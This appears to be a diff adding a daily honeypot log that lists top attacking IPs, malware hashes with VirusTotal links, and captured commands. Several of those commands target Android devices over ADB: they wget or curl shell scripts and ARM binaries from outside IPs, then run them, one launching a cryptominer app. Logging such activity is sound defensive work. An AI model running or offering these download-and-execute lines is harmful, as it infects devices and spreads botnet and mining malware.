@@ -1,0 +1,22 @@
+Top 5 IPs for 2023-12-14:
+54.39.7.85
+159.89.178.230
+20.24.228.90
+119.29.131.124
+208.115.214.165
+
+Malware seen: 
+Hash: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+Hash: 26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+https://www.virustotal.com/gui/file/26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+Hash: 63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+https://www.virustotal.com/gui/file/63946c28efa919809c03be75a3937c4be80589a9df79cd1be72037d493b70857
+
+
+cd /data/local/tmp/; busybox wget http://93.123.85.124/w.sh; sh w.sh; curl http://93.123.85.124/c.sh; sh c.sh; wget http://93.123.85.124/luh.sh; sh luh.sh
+am start -n com.ufo.miner/com.example.test.MainActivity
+
+cd /data/local/tmp/; rm *; busybox wget http://176.97.210.229/crond.arm7; chmod 777 crond.arm7; ./crond.arm7
+
+cd /data/local/tmp/; rm -rf *; busybox wget http://45.95.147.171/arm4; chmod +x arm4; ./arm4 adb; busybox wget http://45.95.147.171/arm5; chmod +x arm5; ./arm5 adb; busybox wget http://45.95.147.171/arm6; chmod +x arm6; ./arm6 adb; busybox wget http://45.95.147.171/arm7; chmod +x arm7; ./arm7 adb
